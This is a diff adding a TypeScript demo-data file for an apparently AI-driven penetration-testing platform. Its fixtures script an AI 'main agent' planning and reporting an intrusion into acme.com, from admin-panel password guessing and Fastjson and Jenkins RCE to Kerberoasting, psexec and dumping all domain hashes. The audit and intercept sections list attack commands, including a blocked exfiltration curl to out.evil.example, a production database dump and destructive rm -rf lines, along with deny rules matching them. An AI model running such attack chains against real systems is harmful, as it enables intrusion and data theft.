+    seq: 71,
+    worker: "mainagent",
+    ts: T("2026-07-26T03:18:06Z"),
+    kind: "text",
+    summary:
+      "admin.acme.com is an Element-UI back office with no CAPTCHA or rate limiting. I recommend trying the default password list (admin/admin123) first, then moving on to a dictionary attack. I've already injected a high-priority intent into the worker agent.",
+  },
+  {
+    seq: 72,
+    worker: "mainagent",
+    ts: T("2026-07-26T03:52:00Z"),
+    kind: "user",
+    summary: "We've got the back office. What should we focus on next?",
+  },
+  {
+    seq: 73,
+    worker: "mainagent",
+    ts: T("2026-07-26T03:52:08Z"),
+    kind: "text",
+    summary:
+      'Goal (2) is reading sensitive user data. I\'m running "enumerate back-office user endpoints" and "API IDOR" in parallel. Bulk exports trigger the interception rules, so you\'ll need to approve them.',
+  },
+  {
+    seq: 400,
+    worker: "mainagent",
+    ts: T("2026-07-25T15:42:00Z"),
+    kind: "user",
+    summary: "We've got a shell. How should we attack from here?",
+  },
+  {
+    seq: 401,
+    worker: "mainagent",
+    ts: T("2026-07-25T15:42:10Z"),
+    kind: "text",
+    summary:
+      "www-data privileges aren't enough, so I'll escalate privileges first (sudo -l looks promising). Once root is obtained, I'll pivot through the DMZ to discover the internal network, prioritizing the domain controller and Jenkins.",
+  },
+  {
+    seq: 402,
+    worker: "mainagent",
+    ts: T("2026-07-25T21:22:00Z"),
+    kind: "user",
+    summary: "The internal network scan is done. That Jenkins host looked unauthenticated, didn't it?",
+  },
+  {
+    seq: 403,
+    worker: "mainagent",
+    ts: T("2026-07-25T21:22:08Z"),
+    kind: "text",
+    summary:
+      "That's right. /script leads straight to Groovy RCE without authentication. I've already injected a hint for the worker to prioritize Jenkins. Once it's compromised, domain credentials can be dumped, followed by Kerberoasting to attack the domain controller.",
+  },
+  {
+    seq: 404,
+    worker: "mainagent",
+    ts: T("2026-07-26T00:22:00Z"),
+    kind: "user",
+    summary: "Did we compromise DC01? Give me a summary.",
+  },
+  {
+    seq: 405,
+    worker: "mainagent",
+    ts: T("2026-07-26T00:22:12Z"),
+    kind: "text",
+    summary:
+      "Confirmed compromise. The attack path is as follows: shop Fastjson RCE → DMZ privilege escalation → internal Jenkins domain credential dump → svc_deploy belongs to Domain Admins → psexec DC01 SYSTEM → secretsdump the entire domain's hashes. All four goals are either achieved or in progress.",
+  },
+];
+
+export function activityForTask(): Activity[] {
+  return activity;
+}
+
+// ── Token stats ──────────────────────────────────────────────────────────────
+export const tokenWorkers: TokenUsage[] = [
+  {
+    worker: "planner",
+    input_tokens: 320000,
+    output_tokens: 24000,
+    cache_read_tokens: 210000,
+    cache_write_tokens: 33000,
+  },
+  {
+    worker: "work#1",
+    input_tokens: 288000,
+    output_tokens: 21000,
+    cache_read_tokens: 190000,
+    cache_write_tokens: 28000,
+  },
+  {
+    worker: "work#2",
+    input_tokens: 402000,
+    output_tokens: 31000,
+    cache_read_tokens: 280000,
+    cache_write_tokens: 41000,
+  },
+  {
+    worker: "work#3",
+    input_tokens: 274500,
+    output_tokens: 20320,
+    cache_read_tokens: 210400,
+    cache_write_tokens: 30000,
+  },
+  { worker: "workG", input_tokens: 88000, output_tokens: 5200, cache_read_tokens: 60000, cache_write_tokens: 8000 },
+  { worker: "work#6", input_tokens: 64000, output_tokens: 4100, cache_read_tokens: 42000, cache_write_tokens: 6000 },
+  { worker: "work#7", input_tokens: 132000, output_tokens: 8600, cache_read_tokens: 90000, cache_write_tokens: 12000 },
+  { worker: "work#8", input_tokens: 74000, output_tokens: 4700, cache_read_tokens: 50000, cache_write_tokens: 7000 },
+  { worker: "work#9", input_tokens: 82000, output_tokens: 5100, cache_read_tokens: 56000, cache_write_tokens: 8000 },
+  { worker: "work#10", input_tokens: 46000, output_tokens: 3200, cache_read_tokens: 30000, cache_write_tokens: 4500 },
+  { worker: "work#11", input_tokens: 96000, output_tokens: 6200, cache_read_tokens: 64000, cache_write_tokens: 9500 },
+  { worker: "work#12", input_tokens: 108000, output_tokens: 6800, cache_read_tokens: 72000, cache_write_tokens: 10000 },
+  { worker: "work#13", input_tokens: 144000, output_tokens: 9200, cache_read_tokens: 96000, cache_write_tokens: 14000 },
+];
+
+// Mirrors TokenStatsBySession: completed usage is keyed by the stable UI session
+// (main | plan | intent:<id>) instead of the reusable work#N executor name.
+export const tokenSessions: SessionTokenUsage[] = (() => {
+  const totals = new Map<string, SessionTokenUsage>();
+  for (const item of activity) {
+    if (item.kind !== "result") continue;
+    let session = "";
+    if (item.worker === "mainagent") session = "main";
+    else if (item.worker === "planner") session = "plan";
+    else if (item.intent_id) session = `intent:${item.intent_id}`;
+    if (!session) continue;
+    const current = totals.get(session) ?? {
+      session,
+      input_tokens: 0,
+      output_tokens: 0,
+      cache_read_tokens: 0,
+      cache_write_tokens: 0,
+    };
+    current.input_tokens += item.input_tokens ?? 0;
+    current.output_tokens += item.output_tokens ?? 0;
+    current.cache_read_tokens += item.cache_read_tokens ?? 0;
+    current.cache_write_tokens += item.cache_write_tokens ?? 0;
+    totals.set(session, current);
+  }
+  return [...totals.values()];
+})();
+
+export const tokenTotal: TokenTotal = grandTotal;
+
+export const dailyTokens: DailyTokenBucket[] = Array.from({ length: 30 }, (_, i) => {
+  const d = new Date("2026-07-26T00:00:00Z");
+  d.setUTCDate(d.getUTCDate() - (29 - i));
+  const wave = 40000 + Math.round(30000 * Math.abs(Math.sin(i / 3)));
+  return {
+    date: d.toISOString().slice(0, 10),
+    input_tokens: wave,
+    output_tokens: Math.round(wave * 0.08),
+    cache_read_tokens: Math.round(wave * 0.7),
+    cache_write_tokens: Math.round(wave * 0.12),
+  };
+});
+
+export const convTokens: ConvTokenSummary[] = [
+  {
+    llm_profile_id: 1,
+    created_at: T("2026-07-25T10:00:00Z"),
+    input_tokens: 42000,
+    output_tokens: 3800,
+    cache_read_tokens: 26000,
+    cache_write_tokens: 5200,
+  },
+  {
+    llm_profile_id: 2,
+    created_at: T("2026-07-24T16:00:00Z"),
+    input_tokens: 18000,
+    output_tokens: 1600,
+    cache_read_tokens: 9000,
+    cache_write_tokens: 2100,
+  },
+];
+
+// ── Traffic ──────────────────────────────────────────────────────────────────
+const exchanges = [
+  ["x-1", "www.acme.com", "GET", "https://www.acme.com/", 200, "text/html", 48213],
+  ["x-2", "www.acme.com", "GET", "https://www.acme.com/search?q=test", 200, "text/html", 5120],
+  ["x-3", "www.acme.com", "GET", "https://www.acme.com/.git/HEAD", 200, "text/plain", 23],
+  ["x-4", "admin.acme.com", "GET", "https://admin.acme.com/login", 200, "text/html", 12044],
+  ["x-5", "admin.acme.com", "POST", "https://admin.acme.com/login", 302, "text/html", 0],
+  ["x-6", "admin.acme.com", "GET", "https://admin.acme.com/dashboard", 200, "text/html", 33120],
+  ["x-7", "admin.acme.com", "GET", "https://admin.acme.com/api/users?page=1", 200, "application/json", 8842],
+  ["x-8", "api.acme.com", "GET", "https://api.acme.com/v1/orders?id=1001", 200, "application/json", 640],
+  ["x-9", "api.acme.com", "GET", "https://api.acme.com/v1/orders?id=1002", 200, "application/json", 655],
+  ["x-10", "api.acme.com", "GET", "https://api.acme.com/v1/users/me", 200, "application/json", 312],
+  ["x-11", "api.acme.com", "GET", "https://api.acme.com/v1/admin", 401, "application/json", 45],
+  ["x-12", "shop.acme.com", "GET", "https://shop.acme.com/checkout", 200, "text/html", 21990],
+  ["x-13", "shop.acme.com", "POST", "https://shop.acme.com/pay", 200, "application/json", 128],
+  ["x-14", "www.acme.com", "GET", "https://www.acme.com/robots.txt", 200, "text/plain", 88],
+  ["x-15", "shop.acme.com", "POST", "https://shop.acme.com/api/import", 500, "application/json", 2048],
+  ["x-16", "shop.acme.com", "POST", "https://shop.acme.com/api/import", 200, "application/json", 0],
+  ["x-17", "10.10.10.20", "GET", "http://10.10.10.20:8080/script", 200, "text/html", 14200],
+  ["x-18", "10.10.10.20", "POST", "http://10.10.10.20:8080/scriptText", 200, "text/plain", 86],
+  ["x-19", "10.10.10.10", "POST", "https://10.10.10.10:445/psexec", 200, "application/octet-stream", 0],
+] as const;
+
+export const traffic: TrafficResp = {
+  enabled: true,
+  proxy: ":8788",
+  count: exchanges.length,
+  total: exchanges.length,
+  page: 0,
+  size: 100,
+  exchanges: exchanges.map(([id, host, method, url, status, ct, len], i) => ({
+    id,
+    host,
+    method,
+    url,
+    status,
+    content_type: ct,
+    resp_len: len,
+    ts: T(`2026-07-26T0${1 + (i % 3)}:${String(10 + i).padStart(2, "0")}:00Z`),
+  })),
+};
+
+// Distinct hosts with counts, derived from the exchanges above (target picker).
+const hostCounts: Record<string, number> = {};
+for (const [, host] of exchanges) hostCounts[host] = (hostCounts[host] ?? 0) + 1;
+export const trafficHosts: TrafficHost[] = Object.entries(hostCounts).map(([host, count]) => ({ host, count }));
+
+export const trafficDetail: TrafficDetail = {
+  req: `GET /v1/orders?id=1002 HTTP/1.1
+Host: api.acme.com
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+User-Agent: ARTEX-worker/1.0
+Accept: application/json
+
+`,
+  resp: `HTTP/1.1 200 OK
+Content-Type: application/json
+Content-Length: 655
+
+{
+  "order_id": 1002,
+  "user_id": 77,
+  "amount": 1299.00,
+  "address": "Gangnam-gu, Seoul ****",
+  "phone": "138****6021",
+  "items": [{ "sku": "A-100", "qty": 1 }]
+}`,
+};
+
+// ── Security / Audit ─────────────────────────────────────────────────────────
+export const audit: Audit = {
+  attributions: { allow: 312, block: 9 },
+  entries: [
+    {
+      ts: T("2026-07-26T03:33:00Z"),
+      tool: "bash",
+      action: "allow",
+      command: "curl -s -d 'username=admin...' https://admin.acme.com/login",
+    },
+    {
+      ts: T("2026-07-26T03:57:00Z"),
+      tool: "bash",
+      action: "allow",
+      command: "curl -s -b 'session=...' https://admin.acme.com/api/users",
+    },
+    {
+      ts: T("2026-07-26T02:10:00Z"),
+      tool: "bash",
+      action: "block",
+      reason: "Out of target scope: out.evil.example is not in scope",
+      command: "curl https://out.evil.example/exfil",
+    },
+    {
+      ts: T("2026-07-25T22:03:00Z"),
+      tool: "bash",
+      action: "allow",
+      command: "sqlmap -u 'https://www.acme.com/search?q=1' --batch",
+    },
+    {
+      ts: T("2026-07-25T21:00:00Z"),
+      tool: "bash",
+      action: "block",
+      reason: "Destructive command blocked: rm -rf rejected",
+      command: "rm -rf /var/www",
+    },
+    {
+      ts: T("2026-07-25T20:30:00Z"),
+      tool: "bash",
+      action: "allow",
+      command: "git-dumper https://www.acme.com/.git/ /tmp/acme",
+    },
+    {
+      ts: T("2026-07-25T15:20:00Z"),
+      tool: "bash",
+      action: "allow",
+      command:
+        "curl -s -H 'Content-Type: application/json' -d '{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"...}' https://shop.acme.com/api/import",
+    },
+    {
+      ts: T("2026-07-25T21:40:00Z"),
+      tool: "bash",
+      action: "allow",
+      command: "curl -s -d 'script=println+\"whoami\"...' http://10.10.10.20:8080/scriptText",
+    },
+    {
+      ts: T("2026-07-26T00:00:00Z"),
+      tool: "bash",
+      action: "allow",
+      command: "impacket-psexec acme.local/svc_deploy@10.10.10.10",
+    },
+    {
+      ts: T("2026-07-26T00:05:00Z"),
+      tool: "bash",
+      action: "block",
+      reason: "Data exfiltration blocked: secretsdump requires manual approval",
+      command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc",
+    },
+    {
+      ts: T("2026-07-26T00:06:00Z"),
+      tool: "bash",
+      action: "allow",
+      command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc  # allowed after approval",
+    },
+  ],
+};
+
+// ── LLM profiles ─────────────────────────────────────────────────────────────
+export const llmProfiles: LLMProfile[] = [
+  {
+    id: "1",
+    name: "Claude Opus 4.8",
+    format: "anthropic",
+    model: "claude-opus-4-8",
+    api_key_hint: "…a3f2",
+    rate_per_second: 0,
+    rate_per_minute: 0,
+    context_window_k: 1000,
+    thinking_type: "enabled",
+    reasoning_effort: "high",
+    is_default: true,
+    priority: 0,
+    pool_exclude: false,
+    // anthropic 的字段名固定，故 max_tokens_field 恒为空。
+    max_tokens: 0,
+    max_tokens_field: "",
+  },
+  {
+    id: "2",
+    name: "DeepSeek V4",
+    format: "openai",
+    base_url: "https://api.deepseek.com",
+    model: "deepseek-v4-flash",
+    api_key_hint: "…9c11",
+    rate_per_second: 0,
+    rate_per_minute: 60,
+    context_window_k: 128,
+    thinking_type: "",
+    reasoning_effort: "",
+    is_default: false,
+    priority: 10,
+    pool_exclude: false,
+    // openai 格式 + 推理模型：上限走 max_completion_tokens。
+    max_tokens: 8192,
+    max_tokens_field: "max_completion_tokens",
+  },
+];
+
+export const llmConfig = {
+  configured: true,
+  provider: "anthropic",
+  model: "claude-opus-4-8",
+  base_url: "",
+  proxy: "",
+  key_set: true,
+  rate_per_second: 0,
+  rate_per_minute: 0,
+  context_window_k: 1000,
+  thinking_type: "enabled",
+  reasoning_effort: "high",
+};
+
+// ── Agents ───────────────────────────────────────────────────────────────────
+export const agents: Agent[] = [
+  {
+    id: "1001",
+    key: "retester",
+    name: "Finding Retester",
+    role: "assistant",
+    builtin: false,
+    enabled: true,
+    description: "Started manually from a finding's detail view; saves an independent retest conclusion.",
+    max_turns: 0,
+    mcp_count: 0,
+    skill_count: 0,
+    tool_count: 2,
+  },
+  {
+    id: "1",
+    key: "goals",
+    name: "Goal Decomposer",
+    role: "goals",
+    builtin: true,
+    enabled: true,
+    description: "Decomposes the task goal into explorable sub-goals.",
+    max_turns: 8,
+    mcp_count: 0,
+    skill_count: 1,
+    tool_count: 3,
+  },
+  {
+    id: "2",
+    key: "planner",
+    name: "Planner",
+    role: "planner",
+    builtin: true,
+    enabled: true,
+    description: "Reads the exploration graph, judges goal achievement, and generates intents.",
+    max_turns: 0,
+    mcp_count: 1,
+    skill_count: 2,
+    tool_count: 9,
+  },
+  {
+    id: "3",
+    key: "mainagent",
+    name: "Main Agent",
+    role: "mainagent",
+    builtin: true,
+    enabled: true,
+    description: "Human-in-the-loop conversation that injects hints and high-priority intents.",
+    max_turns: 0,
+    web_search: true,
+    mcp_count: 2,
+    skill_count: 3,
+    tool_count: 11,
+  },
+  {
+    id: "4",
+    key: "worker",
+    name: "Work Agent",
+    role: "worker",
+    builtin: true,
+    enabled: true,
+    description: "Claims an intent → runs Kali tools → writes results back to the graph",
+    max_turns: 40,
+    run_seconds: 1800,
+    web_search: false,
+    interactive_shell: true,
+    mcp_count: 2,
+    skill_count: 3,
+    tool_count: 14,
+  },
+  {
+    id: "5",
+    key: "recon-bot",
+    name: "Recon Bot (Custom)",
+    role: "custom",
+    builtin: false,
+    enabled: true,
+    description: "Periodically performs passive reconnaissance on new assets.",
+    max_turns: 12,
+    mcp_count: 1,
+    skill_count: 1,
+    tool_count: 4,
+  },
+];
+
+const promptVars: PromptVar[] = [
+  {
+    name: "Goal",
+    description: "The current task goal",
+    example: "Obtain acme.com admin back office access",
+    source: "runtime",
+  },
+  {
+    name: "AssetSummary",
+    description: "Asset graph overview",
+    example: "6 subdomains / 3 IPs / 4 applications / 4 endpoints",
+    source: "distilled",
+  },
+  {
+    name: "RouteHint",
+    description: "Exploration route hint",
+    example: "Prioritize the back office and API authorization-bypass attack surface",
+    source: "exploration",
+  },
+];
+
+const promptVersions: PromptVersion[] = [
+  {
+    version: 3,
+    ts: T("2026-07-25T10:00:00Z"),
+    note: "Strengthened guidance for authorization-bypass detection",
+    template_text: "你是 ARTEX 的规划者……",
+  },
+  {
+    version: 2,
+    ts: T("2026-07-20T10:00:00Z"),
+    note: "Minor tuning of the initial version",
+    template_text: "你是 ARTEX 的规划者(v2)……",
+  },
+];
+
+export function agentDetail(key: string): AgentDetail {
+  const a = agents.find((x) => x.key === key) ?? agents[1];
+  return {
+    agent: a,
+    prompt: `你是 ARTEX 的「${a.name}」。\n目标：{{.Goal}}\n资产概览：{{.AssetSummary}}\n路线提示：{{.RouteHint}}\n请基于以上信息推进探索，并通过工具把结果写回图。`,
+    variables: promptVars,
+    versions: promptVersions,
+    visibility: { mcp: [1, 2], skill: ["api-recon", "playwright-cli"] },
+    wrapup_prompt: "",
+    wrapup_default:
+      "The time/step budget will be exhausted soon. Summarize the confirmed findings and mark the intent as finished.",
+    wrapup_max_turns: 0,
+    wrapup_max_turns_default: 3,
+    task_timeout_wrapup_supported: a.key === "worker" || a.key === "planner",
+    task_timeout_wrapup_default: "The task has timed out. Wrap up immediately and save the current conclusions.",
+    task_timeout_wrapup_max_turns_default: 2,
+  };
+}
+
+// ── MCP ──────────────────────────────────────────────────────────────────────
+export const mcpServers: MCPServer[] = [
+  {
+    id: 1,
+    name: "shodan",
+    transport: "http",
+    url: "https://mcp.shodan.io/sse",
+    args: [],
+    env: {},
+    enabled: true,
+    tools: ["host_info", "search", "dns_resolve"],
+  },
+  {
+    id: 2,
+    name: "playwright",
+    transport: "stdio",
+    command: "npx",
+    args: ["-y", "@playwright/mcp"],
+    env: {},
+    enabled: true,
+    tools: ["browser_navigate", "browser_click", "browser_snapshot"],
+  },
+];
+
+export const mcpToolsById: Record<number, MCPTool[]> = {
+  1: [
+    { name: "host_info", description: "Look up Shodan host information for a specific IP" },
+    { name: "search", description: "Shodan search" },
+    { name: "dns_resolve", description: "DNS resolution" },
+  ],
+  2: [
+    { name: "browser_navigate", description: "Open a URL in the browser" },
+    { name: "browser_click", description: "Click an element" },
+    { name: "browser_snapshot", description: "Capture an accessibility snapshot" },
+  ],
+};
+
+// ── Skills ───────────────────────────────────────────────────────────────────
+export const skills: SkillItem[] = [
+  {
+    name: "api-recon",
+    description:
+      "Performs reconnaissance and authorization-bypass attack-surface enumeration against REST/GraphQL APIs. Use when a new API endpoint is discovered.",
+    license: "MIT",
+    mcps: [],
+    files: ["SKILL.md", "scripts/enum.py"],
+    calls: 24,
+    tasks: 6,
+    usage_agents: ["worker", "planner"],
+    last_used: "2026-08-20T09:12:00Z",
+  },
+  {
+    name: "playwright-cli",
+    description:
+      "Drives a browser with Playwright to perform dynamic crawling and screenshots. Use when a JS-rendered site needs to be rendered.",
+    mcps: ["playwright"],
+    files: ["SKILL.md"],
+    calls: 7,
+    tasks: 3,
+    usage_agents: ["worker"],
+    last_used: "2026-08-19T21:40:00Z",
+  },
+  {
+    name: "scopesentry",
+    description:
+      "Imports assets from ScopeSentry and merges them into the company scope. Use when bulk-importing assets.",
+    files: ["SKILL.md", "assets/mapping.md"],
+    calls: 0,
+    tasks: 0,
+    usage_agents: [],
+  },
+];
+
+export const skillCalls: SkillCall[] = [
+  { ts: "2026-08-20T09:12:00Z", agent_key: "worker", task_id: 42, session_id: "", args_len: 128 },
+  { ts: "2026-08-20T08:03:00Z", agent_key: "planner", task_id: 42, session_id: "", args_len: 0 },
+  { ts: "2026-08-19T17:55:00Z", agent_key: "worker", task_id: 37, session_id: "", args_len: 64 },
+];
+
+export const missingSkills: MissingSkill[] = [
+  { skill: "jwt-forge", calls: 3, agents: ["worker"], last_used: "2026-08-20T07:20:00Z" },
+];
+
+// ── Tools ────────────────────────────────────────────────────────────────────
+export const tools: Tool[] = [
+  {
+    key: "bash",
+    system: true,
+    description: "Executes shell commands in the Kali environment (scope and destructive-command blocking apply).",
+    schema: { type: "object", properties: { command: { type: "string" } }, required: ["command"] },
+    agents: ["worker", "mainagent"],
+    enabled: true,
+    kind: "builtin",
+    calls: 1842,
+  },
+  {
+    key: "report_finding",
+    system: true,
+    description: "Reports a security finding and links it to the related node.",
+    schema: {
+      type: "object",
+      properties: {
+        vulnclass: { type: "string" },
+        severity: { type: "string" },
+        summary: { type: "string" },
+        evidence: { type: "string" },
+      },
+      required: ["vulnclass", "severity", "summary"],
+    },
+    agents: ["worker"],
+    enabled: true,
+    kind: "builtin",
+    calls: 96,
+  },
+  {
+    key: "upsert_asset",
+    system: true,
+    description: "Records and updates an asset node.",
+    schema: { type: "object", properties: { type: { type: "string" }, value: { type: "string" } } },
+    agents: ["worker"],
+    enabled: true,
+    kind: "builtin",
+    calls: 417,
+  },
+  {
+    key: "list_goals",
+    system: true,
+    description: "Lists the current task's goals and their achievement status.",
+    schema: { type: "object", properties: {} },
+    agents: ["planner"],
+    enabled: true,
+    kind: "builtin",
+    calls: 238,
+  },
+  {
+    key: "nuclei_scan",
+    system: false,
+    description: "Custom: runs the specified template with nuclei.",
+    schema: {
+      type: "object",
+      properties: { target: { type: "string" }, template: { type: "string" } },
+      required: ["target"],
+    },
+    agents: ["worker"],
+    enabled: true,
+    kind: "command",
+    exec: { command: "nuclei", args: ["-u", "{{target}}"] },
+    calls: 31,
+  },
+];
+
+// ── Settings ─────────────────────────────────────────────────────────────────
+export const settings: Settings = {
+  traffic_capture: true,
+  agent_traffic_binding: false,
+  llm_record: false,
+  web_search_enabled: true,
+  web_search_backend: "ddgs",
+  brave_key_set: false,
+  tavily_key_set: true,
+  web_search_proxy: "",
+  global_proxy: "",
+  python_interpreter: "/usr/bin/python3",
+  workers: 3,
+  llm_pool_enabled: true,
+  llm_pool_bind_fallback: false,
+  noa_compaction: false,
+};
+
+// ── LLM 轮询（故障转移）──────────────────────────────────────────────────────
+// demo：激活配置正常，备用配置刚因余额不足熔断，正在冷却。
+export const llmPool: LLMPoolStatus = {
+  enabled: true,
+  bind_fallback: false,
+  chain: [
+    {
+      profile_id: "1",
+      name: "Claude Opus 4.8",
+      model: "claude-opus-4-8",
+      format: "anthropic",
+      priority: 0,
+      active: true,
+      excluded: false,
+      state: "ok",
+      fails: 0,
+      trips: 0,
+      cooldown_secs: 0,
+    },
+    {
+      profile_id: "2",
+      name: "DeepSeek V4",
+      model: "deepseek-v4-flash",
+      format: "openai",
+      priority: 10,
+      active: false,
+      excluded: false,
+      state: "tripped",
+      fails: 0,
+      trips: 1,
+      cooldown_secs: 42,
+      last_error: "openai: status 402: insufficient balance",
+      last_at: T("2026-07-26T00:10:00Z"),
+    },
+  ],
+};
+
+// ── Intercept ────────────────────────────────────────────────────────────────
+export const interceptRules: InterceptRule[] = [
+  {
+    id: 1,
+    name: "Destructive Command Requires Approval",
+    enabled: true,
+    priority: 10,
+    match_target: "tool_input",
+    match_type: "regex",
+    pattern: "rm\\s+-rf|mkfs|dd\\s+if=",
+    action: "ask",
+    message: "Destructive command detected, manual approval required",
+    timeout_enabled: true,
+    timeout_seconds: 120,
+    timeout_action: "deny",
+    created_at: T("2026-07-20T10:00:00Z"),
+    updated_at: T("2026-07-20T10:00:00Z"),
+  },
+  {
+    id: 2,
+    name: "Immediately Deny Outbound Traffic",
+    enabled: true,
+    priority: 20,
+    match_target: "tool_input",
+    match_type: "string",
+    pattern: "exfil",
+    action: "deny",
+    message: "Suspected data exfiltration",
+    timeout_enabled: false,
+    timeout_seconds: 0,
+    timeout_action: "deny",
+    created_at: T("2026-07-21T10:00:00Z"),
+    updated_at: T("2026-07-21T10:00:00Z"),
+  },
+];
+
+export const interceptPending: InterceptPending[] = [
+  {
+    id: 101,
+    rule_id: 1,
+    task_id: "t-acme-web",
+    agent_name: "work#3",
+    tool_name: "bash",
+    tool_input: { command: "mysqldump -h 203.0.113.10 -uroot acme_prod > /tmp/dump.sql" },
+    status: "pending",
+    reason: "Data exfiltration blocked: full DB dump requires manual approval",
+    created_at: T("2026-07-26T03:58:00Z"),
+  },
+];
+
+export const interceptHistory: InterceptApprovalRow[] = [
+  {
+    id: 90,
+    rule_id: 1,
+    task_id: "t-acme-web",
+    agent_name: "work#1",
+    tool_name: "bash",
+    tool_input: { command: "dd if=/dev/zero of=/tmp/x" },
+    status: "denied",
+    reason: "Destructive command requires approval",
+    created_at: T("2026-07-25T20:00:00Z"),
+    decided_at: T("2026-07-25T20:01:00Z"),
+    conv_title: "",
+    conv_agent_key: "",
+    rule_name: "Destructive Command Requires Approval",
+  },
+  {
+    id: 91,
+    task_id: "t-acme-api",
+    agent_name: "work#2",
+    tool_name: "bash",
+    tool_input: { command: "rm -rf /var/www/html" },
+    status: "denied",
+    reason: "[模型] Deletes a target production file (D4)",
+    created_at: T("2026-07-25T18:00:00Z"),
+    decided_at: T("2026-07-25T18:00:05Z"),
+    conv_title: "",
+    conv_agent_key: "",
+    rule_name: "",
+  },
+  {
+    id: 92,
+    rule_id: 2,
+    task_id: "t-acme-web",
+    agent_name: "work#13",
+    tool_name: "bash",
+    tool_input: { command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc" },
+    status: "allowed",
+    reason: "Immediately deny outbound traffic",
+    created_at: T("2026-07-26T00:05:00Z"),
+    decided_at: T("2026-07-26T00:06:00Z"),
+    conv_title: "",
+    conv_agent_key: "",
+    rule_name: "Immediately Deny Outbound Traffic",
+  },
+  {
+    id: 93,
+    task_id: "t-acme-web",
+    agent_name: "work#7",
+    tool_name: "bash",
+    tool_input: { command: 'mysql -e "DROP TABLE users_bak_0921"' },
+    status: "pending",
+    reason: "[模型] Suspected to be a backup table; cannot confirm whether it is production data",
+    created_at: T("2026-07-25T15:14:00Z"),
+    conv_title: "",
+    conv_agent_key: "",
+    rule_name: "",
+  },
+];
+
+// Approval detail fixtures use harmless report-writing examples.
+interceptHistory.unshift({
+  id: 94,
+  task_id: "t-acme-web",
+  agent_name: "work#1",
+  tool_name: "Write",
+  tool_input: {
+    path: "reports/summary.md",
+    content:
+      "# Review Summary\n\nThis round's verification is complete; summarizing existing evidence and follow-up recommendations.",
+  },
+  status: "allowed",
+  decision_source: "model",
+  reason: "[模型] Recording the existing review conclusions in a local report without modifying business data.",
+  created_at: T("2026-07-26T08:00:00Z"),
+  decided_at: T("2026-07-26T08:00:02Z"),
+  conv_title: "",
+  conv_agent_key: "",
+  rule_name: "",
+});
+
+export const interceptDetails: Record<number, InterceptAudit> = {
+  94: {
+    run_id: "demo-run-report",
+    tool_use_id: "call-write-report",
+    correlation: "exact",
+    input_digest: "a3b458eca3b458eca3b458eca3b458eca3b458eca3b458eca3b458eca3b458ec1234",
+    user_message:
+      "Summarize the completed review and record the conclusions and evidence index in reports/summary.md.\nLeave pending-verification items as-is and don't touch business data.",
+    context: [
+      { kind: "user", text: "Gather this round's existing evidence and produce a review summary." },
+      {
+        kind: "tool_use",
+        tool: "Read",
+        tool_use_id: "call-read-evidence",
+        text: '{"path":"reports/evidence-index.json"}',
+      },
+      {
+        kind: "tool_result",
+        tool: "Read",
+        tool_use_id: "call-read-evidence",
+        text: "Read 3 evidence index entries.\nThe records contain the request time, result summary, and local file location.",
+      },
+    ],
+    captured_at: T("2026-07-26T08:00:00Z"),
+    initial_action: "allow",
+    initial_reason:
+      "[模型] Recording the existing review conclusions in a local report without modifying business data.",
+    effective_action: "allow",
+    config_digest: "b4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fd1234",
+    profile_id: 1,
+    execution_status: "succeeded",
+    output: "Successfully wrote reports/summary.md\nRecorded 68 characters total.",
+    execution_ended_at: T("2026-07-26T08:00:03Z"),
+  },
+  93: {
+    run_id: "demo-run-review",
+    tool_use_id: "call-pending-review",
+    correlation: "exact",
+    input_digest: "c5d670aec5d670aec5d670aec5d670aec5d670aec5d670aec5d670aec5d670ae1234",
+    user_message: "Check what the backup table is used for, and check first if deletion is involved.",
+    context: [],
+    captured_at: T("2026-07-25T15:14:00Z"),
+    initial_action: "ask",
+    initial_reason: "[模型] Suspected to be a backup table; cannot confirm whether it is production data.",
+    profile_id: 1,
+    execution_status: "not_started",
+  },
+};
+
+// ── Conversations (chat) ─────────────────────────────────────────────────────
+export const conversations: Conversation[] = [
+  {
+    id: 1,
+    agent_key: "mainagent",
+    title: "Discussing acme back office entry points",
+    llm_profile_id: 1,
+    pinned: true,
+    pinned_at: T("2026-07-26T04:00:00Z"),
+    created_at: T("2026-07-25T10:00:00Z"),
+    updated_at: T("2026-07-26T03:40:00Z"),
+  },
+  {
+    id: 2,
+    agent_key: "mainagent",
+    title: "Summarizing the API authorization-bypass attack surface",
+    llm_profile_id: 2,
+    created_at: T("2026-07-24T16:00:00Z"),
+    updated_at: T("2026-07-24T17:20:00Z"),
+  },
+  {
+    id: 3,
+    agent_key: "mainagent",
+    title: "Internal lateral movement · Planning the DMZ-to-domain-controller attack path",
+    llm_profile_id: 1,
+    created_at: T("2026-07-25T15:45:00Z"),
+    updated_at: T("2026-07-26T00:25:00Z"),
+  },
+];
+
+export const conversationMessages: Record<number, Activity[]> = {
+  1: [
+    {
+      seq: 1,
+      worker: "user",
+      ts: T("2026-07-25T10:00:00Z"),
+      kind: "user",
+      summary: "Where's the back office, and where should we start attacking?",
+    },
+    {
+      seq: 2,
+      worker: "mainagent",
+      ts: T("2026-07-25T10:00:04Z"),
+      kind: "thinking",
+      summary:
+        "First check the tech stack and defenses (CAPTCHA/rate limiting) on the admin.acme.com login page, then decide whether to use default passwords or a dictionary attack.",
+    },
+    {
+      seq: 3,
+      worker: "mainagent",
+      ts: T("2026-07-25T10:00:06Z"),
+      kind: "tool_use",
+      tool: "bash",
+      tool_use_id: "c11",
+      summary: "curl -s https://admin.acme.com/login | grep -Eo 'element-ui|captcha|csrf'",
+    },
+    {
+      seq: 4,
+      worker: "mainagent",
+      ts: T("2026-07-25T10:00:08Z"),
+      kind: "tool_result",
+      tool: "bash",
+      tool_use_id: "c11",
+      summary: "element-ui\ncsrf",
+      detail: "This is an Element-UI back office; it has a CSRF token but no CAPTCHA.",
+    },
+    {
+      seq: 5,
+      worker: "mainagent",
+      ts: T("2026-07-25T10:00:20Z"),
+      kind: "tool_use",
+      tool: "bash",
+      tool_use_id: "c12",
+      summary:
+        "for i in 1 2 3 4 5; do curl -s -o /dev/null -w '%{http_code}\\n' -d 'username=x&password=y' https://admin.acme.com/login; done",
+    },
+    {
+      seq: 6,
+      worker: "mainagent",
+      ts: T("2026-07-25T10:00:24Z"),
+      kind: "tool_result",
+      tool: "bash",
+      tool_use_id: "c12",
